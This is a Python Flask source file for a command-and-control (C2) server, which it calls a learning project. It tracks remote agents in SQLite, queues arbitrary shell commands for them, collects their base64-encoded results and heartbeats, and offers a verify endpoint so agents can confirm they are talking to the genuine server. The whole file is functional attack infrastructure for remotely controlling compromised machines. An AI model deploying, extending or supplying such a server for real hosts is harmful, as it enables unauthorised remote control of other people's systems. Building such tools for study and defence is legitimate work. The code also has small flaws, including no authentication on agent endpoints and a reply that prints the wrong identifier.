from flask import Flask, request, abort
import base64
import sqlite3 as sl
import json
import uuid
import random

################
# DATABASE SETUP
################

# For dev purposes keep the DB in memory
#conn = sl.connect('agents.db', check_same_thread=False)
conn = sl.connect(':memory:', check_same_thread=False)

# Create tables agents and commands
c = conn.cursor()
# Basic agent data
c.execute("""CREATE TABLE agents (
            id INTEGER,
            ip TEXT,
            hostname TEXT,
            sleeptime INTEGER,
            registered_timestamp TEXT,
            note TEXT
    )""")
# All issued commands an their results
c.execute("""CREATE TABLE commands (
            agent_id INTEGER,
            command_UUID TEXT,
            issued_timestamp TEXT,
            command TEXT,
            reported_done_timestamp TEXT,
            result TEXT,
            done INTEGER
    )""")
# All agent heartbeats
c.execute("""CREATE TABLE heartbeats (
            agent_id INTEGER,
            heartbeat_timestamp TEXT
    )""")
conn.commit()
print("DB initialized")

##############
# API - AGENT ENDPOINTS
##############
# TODO: add authentication witch chcecking some secret value
# TODO: add function to check for newly issued commands

app = Flask(__name__)

# Register new agent
# TODO: check for duplicates of ID
@app.route('/agent/register')
def register():
    id = request.args.get('id',default = 0, type = int)
    ip = request.args.get('ip', default = 'TBD', type = str)
    hostname = request.args.get('hostname', default = 'TBD', type = str)
    sleeptime = request.args.get('sleeptime', default = 3, type = int)

    if (id < 1000 or id > 9999):
        id = random.randint(1000, 9999)
    c.execute("INSERT INTO agents (id, ip, hostname, sleeptime, registered_timestamp, note) VALUES (?,?,?,?,CURRENT_TIMESTAMP,'')", (id, ip, hostname, sleeptime))
    return f"Registered agent with id: {id}"

# Update agent info
@app.route('/agent/update')
def update():
    id = request.args.get('id',default = 0, type = int)
    ip = request.args.get('ip', default = 'TBD', type = str)
    hostname = request.args.get('hostname', default = 'TBD', type = str)
    sleeptime = request.args.get('sleeptime', default = 3, type = int)

    if (id < 1000 or id > 9999):
        return f"Invalid agent id. Pass id as GET parameter: ?id=XXXX"
    c.execute("UPDATE agents SET ip=?, hostname=?, sleeptime=? WHERE id = ?", (ip, hostname, sleeptime, id))
    return f"Updated agent with id: {id}"


# Heartbeat function for agent to check-in and (optionally) report command results
@app.route('/agent/heartbeat')
def heartbeat():
    heartbeat = request.args.get('heartbeat',default = '0', type = str)
    if heartbeat == '0':
        return f"Use base64-encoded JSON heartbeat. Pass heartbeat as GET parameter: ?heartbeat=eyJ..."
    heartbeat_bytes = heartbeat.encode('utf-8')
    heartbeat_decoded = base64.b64decode(heartbeat_bytes)
    heartbeat = heartbeat_decoded.decode('utf-8')

    json_heartbeat = json.loads(heartbeat)
    if "id" not in json_heartbeat:
        return f"Missing agent id. JSON needs to include \"id\" key with agent ID"

    agent_id = json_heartbeat["id"]
    c.execute("INSERT INTO heartbeats (agent_id, heartbeat_timestamp) VALUES (?,CURRENT_TIMESTAMP)", (agent_id,))

    if "uuid" not in json_heartbeat:
        return f"Heartbeat registered for agent ID: {agent_id}. To register command results add parameter \"uuid\" with command UUID to JSON" 
    if "result" not in json_heartbeat:
        return f"Heartbeat registered for agent ID: {agent_id}. To register command results add parameter \"result\" with command output to JSON"

    result_uuid = json_heartbeat["uuid"]
    result = json_heartbeat["result"]

    result_bytes = result.encode('utf-8')
    result_decoded = base64.b64decode(result_bytes)
    result = result_decoded.decode('utf-8')

    c.execute("UPDATE commands SET reported_done_timestamp=CURRENT_TIMESTAMP, result=?, done=1 WHERE command_UUID = ?", (result,result_uuid))
    
    return f"Heartbeat and command result registered for agent ID: {agent_id} "

# Heartbeat function for agent to check-in and (optionally) report command results
@app.route('/agent/getcommand')
def getcommand():
    id = request.args.get('id',default = 0, type = int)
    if (id < 1000 or id > 9999):
        return f"Invalid agent id. Pass id as GET parameter: ?id=XXXX"

    c.execute("SELECT command_UUID,command FROM commands WHERE agent_id = ? and done = 0 LIMIT 1", (id,))

    row = c.fetchall()

    return f"{row}"


# Verify function takes a base64-encoded string, decodes it, reverses an encodes again.
# The purpose is that client can check that it is still communicating with genuine C2 server.
@app.route('/agent/verify/<string:code>')
def verify(code):
    code_bytes = code.encode('ascii')
    code_decoded = base64.b64decode(code_bytes)
    code = code_decoded.decode('ascii')

    code = code[::-1]

    code_bytes = code.encode('ascii')
    code_encoded = base64.b64encode(code_bytes)
    code_bytes = code_encoded.decode('ascii')
    return f"{code_bytes}"

##############
# API - CLIENT ENDPOINTS
##############

# Main page with links to all operator functions
@app.route("/")
def hello_world():
    return '<h3>Simple C2 server built for learning purpposes</h3><b>Operator functionalities:</b><br/><a href="/client/agents">List agents</a><br/><a href="/client/agent?id=XXXX">Agent details</a> (supply agent ID)<br/><a href="/client/command?id=XXXX&command=YYYY">Issue command to agent</a> (supply agent ID and command)<br/><a href="/client/agentnote?id=XXXX&note=YYYY">change agent note</a> (supply agent ID and note)<br/><br/><b>Agent functionalities:</b><br/><a href="/agent/register">Register agent</a>(Supply ID or get a random one)<br/><a href="/agent/update">Update agent info</a>(Supply ID)<br/><a href="/agent/heartbeat?heartbeat=eyJpZCI6MTAwMH0=">Check-in with heartbeat</a>(Supply a base64-encoded JSON)<br/><a href="/agent/getcommand?id=XXXX">Check for new command</a>(supply agent ID)<br/><a href="/agent/verify/<string:code>">Verify server</a>(Supply a base64-encoded string eg: ZGNiYQ==)<br/>'

# List all registered agents
@app.route('/client/agents')
def lsagents():
    if request.remote_addr != '127.0.0.1':
        abort(403)  # Forbidden

    c.execute("SELECT * FROM agents")
    column_names = list(map(lambda x: x[0], c.description))
    results = "Agents:<br/>"
    results+= str(column_names)+'<br/>'
    rows = c.fetchall()
    for row in rows:
        results += str(row)
        results += '<br/>'

    return f"{results}"

# Show agent and its command history for a given agent id
@app.route('/client/agent')
def lsagent():
    if request.remote_addr != '127.0.0.1':
        abort(403)  # Forbidden

    id = request.args.get('id',default = 0, type = int)
    if (id < 1000 or id > 9999):
        return f"Invalid agent id. Pass id as GET parameter: ?id=XXXX"

    c.execute("SELECT * FROM agents WHERE id = ?", (id,))
    column_names = list(map(lambda x: x[0], c.description))
    results = "Agent:<br/>"
    results+= str(column_names)+'<br/>'
    rows = c.fetchall()
    for row in rows:
        results += str(row)
        results += '<br/>'
    
    results += "<br/><br/>"
    results += "Agent commands:<br/>"

    c.execute("SELECT * FROM commands WHERE agent_id = ?", (id,))
    column_names = list(map(lambda x: x[0], c.description))
    results+= str(column_names)+'<br/>'
    rows = c.fetchall()
    for row in rows:
        results += str(row)
        results += '<br/>'

    results += "<br/><br/>"
    results += "Last 5 agent heartbeats:<br/>"

    c.execute("SELECT * FROM heartbeats WHERE agent_id = ? ORDER BY heartbeat_timestamp DESC LIMIT 5", (id,))
    column_names = list(map(lambda x: x[0], c.description))
    results+= str(column_names)+'<br/>'
    rows = c.fetchall()
    for row in rows:
        results += str(row)
        results += '<br/>'


    return f"{results}"

# Issue a command to an agent
# TODO: forbid issuing command to non-existent agent
@app.route('/client/command')
def command():
    if request.remote_addr != '127.0.0.1':
        abort(403)  # Forbidden

    id = request.args.get('id',default = 0, type = int)
    if (id < 1000 or id > 9999):
        return f"Invalid agent id. Pass id as GET parameter: ?id=XXXX"
    
    command = request.args.get('command', default = '', type = str)
    if (len(command) <= 1 ):
        return f"Invalid command. Pass command as GET parameter: &command=XXXX"
    
    command_uuid  = str(uuid.uuid4())
    
    c.execute("INSERT INTO commands (agent_id, command_UUID, issued_timestamp, command, reported_done_timestamp, result, done) VALUES (?,?,CURRENT_TIMESTAMP,?,?,?,?)", (id, command_uuid, command, '', '', 0))

    return f"Command '{command}' issued to agent ID {id}"

# Add note to single agent
@app.route('/client/agentnote')
def agentnote():
    if request.remote_addr != '127.0.0.1':
        abort(403)  # Forbidden

    agent_id = request.args.get('id',default = 0, type = int)
    if (agent_id < 1000 or agent_id > 9999):
        return f"Invalid agent id. Pass id as GET parameter: ?id=XXXX"
    
    command = request.args.get('note', default = '', type = str)
    if (len(command) <= 1 ):
        return f"Invalid note. Pass note as GET parameter: &note=XXXX"
    
    c.execute("UPDATE agents SET note=? WHERE id = ?", (command,agent_id))

    return f"Note '{command}' added to agent ID {id}"

